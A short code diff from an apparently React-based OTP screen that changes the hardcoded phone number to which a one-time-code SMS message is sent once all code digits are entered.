@@ -144,7 +144,7 @@ const message = `Y'ello. Please enter the following code: ${otpCode} to complete
     if (otpDigits.every(d => d)) {
      setIsLoading(true);
      sendSMS(
-      "+254708180260",
+      "+254758767793",
       message
     );
       try {
